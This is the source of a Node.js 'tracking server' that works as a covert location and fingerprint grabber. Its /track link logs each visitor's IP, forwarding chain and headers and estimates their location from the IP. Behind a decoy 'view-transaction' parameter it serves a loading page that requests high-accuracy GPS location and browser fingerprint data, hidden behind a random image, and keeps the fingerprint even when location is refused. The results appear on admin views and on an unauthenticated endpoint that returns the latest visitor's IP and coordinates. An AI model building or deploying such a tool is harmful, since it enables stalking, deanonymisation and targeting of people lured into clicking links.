 
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const express = require('express');
const helmet = require('helmet');
const morgan = require('morgan');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const geoip = require('geoip-lite');
const Database = require('better-sqlite3');

// Load env from .env if present (optional)
try {
  require('dotenv').config();
} catch (_) {}

const PORT = Number(process.env.PORT || 3000);
const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;
const REDIRECT_DEFAULT = process.env.REDIRECT_DEFAULT || 'https://example.com';
const ADMIN_KEY = process.env.ADMIN_KEY || 'change-this-key';

const app = express();

// Basic security and logging
app.use(helmet());
app.use(morgan('combined'));
app.use(express.json({ limit: '64kb' }));
app.use(cookieParser());
app.use(cors({ origin: BASE_URL, credentials: true }));

// Ensure data directory exists
const dataDir = path.join(__dirname, '..', 'data');
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}
// Ensure images directory exists for served assets
const imagesDir = path.join(__dirname, '..', 'public', 'images');
if (!fs.existsSync(imagesDir)) {
  fs.mkdirSync(imagesDir, { recursive: true });
}

// Initialize SQLite
const dbPath = path.join(dataDir, 'clicks.db');
const db = new Database(dbPath);
db.pragma('journal_mode = WAL');
db.exec(
  `CREATE TABLE IF NOT EXISTS clicks (
    id TEXT PRIMARY KEY,
    created_at TEXT NOT NULL,
    ip TEXT,
    ip_chain TEXT,
    user_agent TEXT,
    accept_language TEXT,
    referrer TEXT,
    dest_url TEXT,
    approx_country TEXT,
    approx_region TEXT,
    approx_city TEXT,
    approx_lat REAL,
    approx_lon REAL,
    approx_accuracy_km INTEGER,
    precise_lat REAL,
    precise_lon REAL,
    precise_accuracy_m INTEGER,
    precise_timestamp TEXT,
    consented INTEGER DEFAULT 0,
    device_platform TEXT,
    device_vendor TEXT,
    device_language TEXT,
    device_languages TEXT,
    device_timezone TEXT,
    device_hardware_concurrency INTEGER,
    device_memory_gb REAL,
    device_screen_w INTEGER,
    device_screen_h INTEGER,
    device_color_depth INTEGER,
    do_not_track INTEGER
  );`
);

// Best-effort migration for added fields in existing DBs
try {
  const existingCols = new Set(db.prepare(`PRAGMA table_info(clicks)`).all().map(r => r.name));
  const addCol = (name, type) => { if (!existingCols.has(name)) db.exec(`ALTER TABLE clicks ADD COLUMN ${name} ${type}`); };
  addCol('ip_chain', 'TEXT');
  addCol('accept_language', 'TEXT');
  addCol('device_platform', 'TEXT');
  addCol('device_vendor', 'TEXT');
  addCol('device_language', 'TEXT');
  addCol('device_languages', 'TEXT');
  addCol('device_timezone', 'TEXT');
  addCol('device_hardware_concurrency', 'INTEGER');
  addCol('device_memory_gb', 'REAL');
  addCol('device_screen_w', 'INTEGER');
  addCol('device_screen_h', 'INTEGER');
  addCol('device_color_depth', 'INTEGER');
  addCol('do_not_track', 'INTEGER');
} catch (_) {}

const insertClickStmt = db.prepare(
  `INSERT INTO clicks (
    id, created_at, ip, ip_chain, user_agent, accept_language, referrer, dest_url,
    approx_country, approx_region, approx_city, approx_lat, approx_lon, approx_accuracy_km
  ) VALUES (
    @id, @created_at, @ip, @ip_chain, @user_agent, @accept_language, @referrer, @dest_url,
    @approx_country, @approx_region, @approx_city, @approx_lat, @approx_lon, @approx_accuracy_km
  )`
);

const updateGeoStmt = db.prepare(
  `UPDATE clicks SET
    precise_lat = @precise_lat,
    precise_lon = @precise_lon,
    precise_accuracy_m = @precise_accuracy_m,
    precise_timestamp = @precise_timestamp,
    consented = @consented,
    device_platform = @device_platform,
    device_vendor = @device_vendor,
    device_language = @device_language,
    device_languages = @device_languages,
    device_timezone = @device_timezone,
    device_hardware_concurrency = @device_hardware_concurrency,
    device_memory_gb = @device_memory_gb,
    device_screen_w = @device_screen_w,
    device_screen_h = @device_screen_h,
    device_color_depth = @device_color_depth,
    do_not_track = @do_not_track
  WHERE id = @id`
);

function generateId() {
  return crypto.randomBytes(16).toString('hex');
}

function getClientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (typeof xff === 'string' && xff.length > 0) {
    // First IP in XFF list is original client
    return xff.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || req.ip || '';
}

function safeRedirectUrl(input) {
  const maxLen = 2048;
  if (!input || typeof input !== 'string') return REDIRECT_DEFAULT;
  if (input.length > maxLen) return REDIRECT_DEFAULT;
  let parsed;
  try {
    parsed = new URL(input);
  } catch (_) {
    return REDIRECT_DEFAULT;
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return REDIRECT_DEFAULT;
  }
  return parsed.toString();
}

// No UI needed when immediately redirecting

// Health
app.get('/healthz', (req, res) => res.status(200).send('OK'));

// Track route: log IP-based info. Special case: if u=view-transaction → return random image; otherwise redirect to valid URL.
app.get('/track', (req, res) => {
  const destParam = Array.isArray(req.query.u) ? req.query.u[0] : req.query.u;
  const rawDest = destParam ? String(destParam) : '';
  const isImageMode = rawDest === 'view-transaction';
  const destUrl = isImageMode ? null : safeRedirectUrl(rawDest || REDIRECT_DEFAULT);

  const id = generateId();
  const createdAt = new Date().toISOString();
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const acceptLanguage = req.get('accept-language') || '';
  const ipChain = typeof req.headers['x-forwarded-for'] === 'string' ? req.headers['x-forwarded-for'] : '';
  const referrer = req.get('referer') || '';

  let approx = null;
  try {
    approx = ip ? geoip.lookup(ip) : null;
  } catch (_) {
    approx = null;
  }

  const record = {
    id,
    created_at: createdAt,
    ip,
    ip_chain: ipChain,
    user_agent: userAgent,
    accept_language: acceptLanguage,
    referrer,
    dest_url: isImageMode ? rawDest : destUrl,
    approx_country: approx && approx.country ? approx.country : null,
    approx_region: approx && Array.isArray(approx.region) ? approx.region.join(',') : approx && approx.region ? String(approx.region) : null,
    approx_city: approx && approx.city ? approx.city : null,
    approx_lat: approx && approx.ll ? approx.ll[0] : null,
    approx_lon: approx && approx.ll ? approx.ll[1] : null,
    approx_accuracy_km: approx && typeof approx.accuracy === 'number' ? approx.accuracy : null
  };

  try {
    insertClickStmt.run(record);
  } catch (e) {
    // continue
  }

  if (isImageMode) {
    // Set correlation cookie so /api/geo can update this click
    res.cookie('cid', id, { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 5 });
    // Serve minimal HTML that requests geolocation, posts it, then shows a random image
    const html = `<!doctype html>
    <html>
      <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Loading…</title>
        <style>
          html,body { height:100%; margin:0 }
          body { display:flex; align-items:center; justify-content:center; background:#0b0b0b; color:#e5e5e5; font:14px system-ui, -apple-system, Segoe UI, Roboto, sans-serif }
          .box { text-align:center }
          img { max-width: min(92vw, 640px); height: auto; border-radius: 12px; box-shadow: 0 6px 30px rgba(0,0,0,.35) }
          .muted { opacity: .7; margin-top: 8px }
        </style>
      </head>
      <body>
        <div class="box">
          <div id="msg">Requesting location…</div>
          <div class="muted">You may be prompted to allow access.</div>
          <img id="img" alt="" style="display:none" />
        </div>
        <script>
          (function(){
            var msg = document.getElementById('msg');
            var img = document.getElementById('img');
            // Always start loading the image immediately
            img.style.display = 'block';
            img.src = '/image/random?t=' + Date.now();
            img.onerror = function(){ setTimeout(function(){ img.src = '/image/random?t=' + Date.now(); }, 300); };
            function showImage(){ msg.textContent = ''; }
            function postGeo(payload){
              return fetch('/api/geo', { method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include', body: JSON.stringify(payload) });
            }
            function toNum(n){ return (typeof n === 'number' && isFinite(n)) ? n : null; }
            var device = {
              platform: navigator.platform || null,
              vendor: navigator.vendor || null,
              language: navigator.language || null,
              languages: Array.isArray(navigator.languages) ? navigator.languages.slice(0,8) : null,
              timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : null,
              hardwareConcurrency: toNum(navigator.hardwareConcurrency),
              deviceMemory: toNum(navigator.deviceMemory),
              screenW: (window.screen && window.screen.width) ? Number(window.screen.width) : null,
              screenH: (window.screen && window.screen.height) ? Number(window.screen.height) : null,
              colorDepth: (window.screen && window.screen.colorDepth) ? Number(window.screen.colorDepth) : null,
              doNotTrack: (navigator.doNotTrack === '1')
            };
            // If not a secure context (e.g., http on LAN IP), browsers block geolocation.
            // In that case, just show the image immediately.
            if (!('geolocation' in navigator) || !window.isSecureContext) { showImage(); return; }
            var timeout = setTimeout(function(){ showImage(); }, 1500);
            navigator.geolocation.getCurrentPosition(function(pos){
              clearTimeout(timeout);
              var c = pos.coords || {};
              postGeo({ lat: toNum(c.latitude), lon: toNum(c.longitude), accuracy: toNum(c.accuracy), timestamp: pos.timestamp || Date.now(), consented: true, ...device }).finally(showImage);
            }, function(){
              clearTimeout(timeout);
              postGeo({ consented: false, ...device }).finally(showImage);
            }, { enableHighAccuracy: true, timeout: 1800, maximumAge: 0 });
          })();
        </script>
      </body>
    </html>`;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.send(html);
  }

  // Otherwise, redirect to destination
  res.redirect(302, destUrl);
});

function generateRandomSvgImage() {
  const width = 640;
  const height = 360;
  const palettes = [
    ['#0ea5e9', '#22d3ee'],
    ['#22c55e', '#84cc16'],
    ['#ef4444', '#f97316'],
    ['#8b5cf6', '#06b6d4'],
    ['#f59e0b', '#10b981']
  ];
  const emojis = ['😀','🚀','🎯','🔥','🌈','🍕','⭐','❤️','🎲','🛰️','🧠','🦊'];
  const [c1, c2] = palettes[Math.floor(Math.random() * palettes.length)];
  const emoji = emojis[Math.floor(Math.random() * emojis.length)];
  const rx = 16 + Math.floor(Math.random() * 40);
  const rotate = Math.floor(Math.random() * 360);
  const svg = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="${width}" height="${height}" viewBox="0 0 ${width} ${height}">
  <defs>
    <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="${c1}" />
      <stop offset="100%" stop-color="${c2}" />
    </linearGradient>
  </defs>
  <rect x="0" y="0" width="100%" height="100%" fill="url(#g)" rx="${rx}"/>
  <g transform="translate(${width/2}, ${height/2}) rotate(${rotate})">
    <circle cx="0" cy="0" r="112" fill="rgba(255,255,255,0.28)" />
  </g>
  <text x="50%" y="52%" dominant-baseline="middle" text-anchor="middle" font-size="120" fill="#ffffff">${emoji}</text>
</svg>`;
  return svg;
}

function pickRandomImageFile(dir) {
  try {
    const allowed = new Set(['.png', '.jpg', '.jpeg', '.webp', '.gif']);
    const files = fs.readdirSync(dir)
      .filter((f) => allowed.has(path.extname(f).toLowerCase()));
    if (files.length === 0) return null;
    const pick = files[Math.floor(Math.random() * files.length)];
    return path.join(dir, pick);
  } catch (_) {
    return null;
  }
}

// Serve a random image from public/images (fallback to SVG) — no logging here
app.get('/image/random', (req, res) => {
  const file = pickRandomImageFile(imagesDir);
  if (file) {
    res.setHeader('Cache-Control', 'no-store');
    return res.sendFile(file);
  }
  res.setHeader('Content-Type', 'image/svg+xml; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  res.send(generateRandomSvgImage());
});

// Receive precise browser geolocation and device info
app.post('/api/geo', (req, res) => {
  const cid = req.cookies && req.cookies.cid;
  if (!cid) {
    return res.status(400).json({ ok: false, error: 'Missing correlation id' });
  }

  const lat = typeof req.body.lat === 'number' ? req.body.lat : null;
  const lon = typeof req.body.lon === 'number' ? req.body.lon : null;
  const accuracy = typeof req.body.accuracy === 'number' ? req.body.accuracy : null;
  const timestamp = req.body.timestamp ? String(req.body.timestamp) : new Date().toISOString();
  const consented = req.body.consented ? 1 : 0;

  const device = {
    device_platform: req.body.platform ? String(req.body.platform) : null,
    device_vendor: req.body.vendor ? String(req.body.vendor) : null,
    device_language: req.body.language ? String(req.body.language) : null,
    device_languages: Array.isArray(req.body.languages) ? req.body.languages.join(',') : null,
    device_timezone: req.body.timezone ? String(req.body.timezone) : null,
    device_hardware_concurrency: typeof req.body.hardwareConcurrency === 'number' ? req.body.hardwareConcurrency : null,
    device_memory_gb: typeof req.body.deviceMemory === 'number' ? req.body.deviceMemory : null,
    device_screen_w: typeof req.body.screenW === 'number' ? req.body.screenW : null,
    device_screen_h: typeof req.body.screenH === 'number' ? req.body.screenH : null,
    device_color_depth: typeof req.body.colorDepth === 'number' ? req.body.colorDepth : null,
    do_not_track: req.body.doNotTrack ? 1 : 0
  };

  try {
    updateGeoStmt.run({
      id: cid,
      precise_lat: lat,
      precise_lon: lon,
      precise_accuracy_m: accuracy,
      precise_timestamp: timestamp,
      consented,
      ...device
    });
  } catch (e) {
    return res.status(500).json({ ok: false });
  }

  res.json({ ok: true });
});

// Simple admin listing of recent clicks
app.get('/admin', (req, res) => {
  const key = Array.isArray(req.query.key) ? req.query.key[0] : req.query.key;
  if (!key || key !== ADMIN_KEY) return res.status(401).send('Unauthorized');

  const rows = db.prepare(
    `SELECT id, created_at, ip, ip_chain, user_agent, accept_language, referrer, dest_url,
            approx_country, approx_region, approx_city, approx_lat, approx_lon,
            precise_lat, precise_lon, precise_accuracy_m, precise_timestamp, consented,
            device_platform, device_vendor, device_language, device_languages, device_timezone,
            device_hardware_concurrency, device_memory_gb, device_screen_w, device_screen_h, device_color_depth, do_not_track
     FROM clicks ORDER BY created_at DESC LIMIT 200`
  ).all();

  const escapeHtml = (s) => String(s || '').replace(/[&<>"']/g, (c) => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;','\'':'&#39;' }[c]));

  const rowsHtml = rows.map(r => (
    `<tr>
      <td>${escapeHtml(r.id)}</td>
      <td>${escapeHtml(r.created_at)}</td>
      <td>${escapeHtml(r.ip)}</td>
      <td><code>${escapeHtml(r.ip_chain)}</code></td>
      <td>${escapeHtml(r.referrer)}</td>
      <td>${escapeHtml(r.dest_url)}</td>
      <td>${escapeHtml([r.approx_country, r.approx_region, r.approx_city].filter(Boolean).join(' / '))}</td>
      <td>${escapeHtml(r.approx_lat)}, ${escapeHtml(r.approx_lon)}</td>
      <td>${escapeHtml(r.precise_lat)}, ${escapeHtml(r.precise_lon)} (${escapeHtml(r.precise_accuracy_m)} m)</td>
      <td>
        <div>UA: <code>${escapeHtml(r.user_agent)}</code></div>
        <div>Accept-Lang: <code>${escapeHtml(r.accept_language)}</code></div>
        <div>Plat/Vendor: <code>${escapeHtml(r.device_platform)} / ${escapeHtml(r.device_vendor)}</code></div>
        <div>Lang(s): <code>${escapeHtml(r.device_language)} | ${escapeHtml(r.device_languages)}</code></div>
        <div>TZ: <code>${escapeHtml(r.device_timezone)}</code></div>
        <div>HW: <code>${escapeHtml(r.device_hardware_concurrency)} thr, ${escapeHtml(r.device_memory_gb)} GB</code></div>
        <div>Screen: <code>${escapeHtml(r.device_screen_w)}x${escapeHtml(r.device_screen_h)} @ ${escapeHtml(r.device_color_depth)}-bit</code></div>
        <div>DNT: <code>${r.do_not_track ? '1' : '0'}</code></div>
      </td>
      <td>${r.consented ? 'yes' : 'no'}</td>
    </tr>`
  )).join('');

  const html = `<!doctype html>
  <html>
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>Click Logs</title>
      <style>
        body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 24px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; font-size: 13px; vertical-align: top; }
        th { background: #f5f5f5; text-align: left; position: sticky; top: 0; }
        tr:nth-child(even) { background: #fafafa; }
        code { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
      </style>
    </head>
    <body>
      <h1>Recent Clicks</h1>
      <p>Total shown: ${rows.length}</p>
      <table>
        <thead>
          <tr>
            <th>id</th>
            <th>created_at</th>
            <th>ip</th>
            <th>ip chain</th>
            <th>referrer</th>
            <th>dest</th>
            <th>approx</th>
            <th>approx ll</th>
            <th>precise ll (acc)</th>
            <th>device info</th>
            <th>consented</th>
          </tr>
        </thead>
        <tbody>
          ${rowsHtml}
        </tbody>
      </table>
    </body>
  </html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// Root helper
app.get('/', (req, res) => {
  const example = new URL('/track', BASE_URL);
  example.searchParams.set('u', REDIRECT_DEFAULT);
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.send(`Tracking server is running.\n\nUse: ${example.toString()}\nAdmin: ${BASE_URL}/admin?key=********`);
});

// Simple JSON: latest click with IP and best-available coordinates
app.get('/api/last', (req, res) => {
  try {
    const row = db.prepare(
      `SELECT id, created_at, ip, ip_chain,
              approx_lat, approx_lon, approx_accuracy_km,
              precise_lat, precise_lon, precise_accuracy_m
       FROM clicks ORDER BY datetime(created_at) DESC LIMIT 1`
    ).get();
    if (!row) return res.json({ ok: true, data: null });

    const hasPrecise = row.precise_lat !== null && row.precise_lon !== null;
    const coords = hasPrecise
      ? { lat: row.precise_lat, lon: row.precise_lon, accuracy_m: row.precise_accuracy_m, source: 'browser' }
      : { lat: row.approx_lat, lon: row.approx_lon, accuracy_km: row.approx_accuracy_km, source: 'ip' };

    return res.json({
      ok: true,
      data: {
        id: row.id,
        created_at: row.created_at,
        ip: row.ip,
        ip_chain: row.ip_chain,
        coords
      }
    });
  } catch (e) {
    return res.status(500).json({ ok: false });
  }
});

// JSON: list recent clicks with coordinates (requires key)
app.get('/api/logs', (req, res) => {
  const key = Array.isArray(req.query.key) ? req.query.key[0] : req.query.key;
  if (!key || key !== ADMIN_KEY) return res.status(401).json({ ok: false, error: 'unauthorized' });

  const limitRaw = Array.isArray(req.query.limit) ? req.query.limit[0] : req.query.limit;
  const offsetRaw = Array.isArray(req.query.offset) ? req.query.offset[0] : req.query.offset;
  let limit = Number(limitRaw ?? 100);
  let offset = Number(offsetRaw ?? 0);
  if (!Number.isFinite(limit) || limit <= 0) limit = 100;
  if (!Number.isFinite(offset) || offset < 0) offset = 0;
  if (limit > 1000) limit = 1000;

  try {
    const rows = db.prepare(
      `SELECT id, created_at, ip, ip_chain,
              approx_lat, approx_lon, approx_accuracy_km,
              precise_lat, precise_lon, precise_accuracy_m,
              consented
       FROM clicks
       ORDER BY datetime(created_at) DESC
       LIMIT @limit OFFSET @offset`
    ).all({ limit, offset });

    const data = rows.map(r => {
      const hasPrecise = r.precise_lat !== null && r.precise_lon !== null;
      const best = hasPrecise
        ? { lat: r.precise_lat, lon: r.precise_lon, accuracy_m: r.precise_accuracy_m, source: 'browser' }
        : { lat: r.approx_lat, lon: r.approx_lon, accuracy_km: r.approx_accuracy_km, source: 'ip' };
      return {
        id: r.id,
        created_at: r.created_at,
        ip: r.ip,
        ip_chain: r.ip_chain,
        best_coords: best,
        approx: { lat: r.approx_lat, lon: r.approx_lon, accuracy_km: r.approx_accuracy_km },
        precise: { lat: r.precise_lat, lon: r.precise_lon, accuracy_m: r.precise_accuracy_m },
        consented: !!r.consented
      };
    });

    res.json({ ok: true, data, limit, offset });
  } catch (e) {
    res.status(500).json({ ok: false });
  }
});

app.listen(PORT, () => {
  // eslint-disable-next-line no-console
  console.log(`Server listening on ${BASE_URL}`);
});


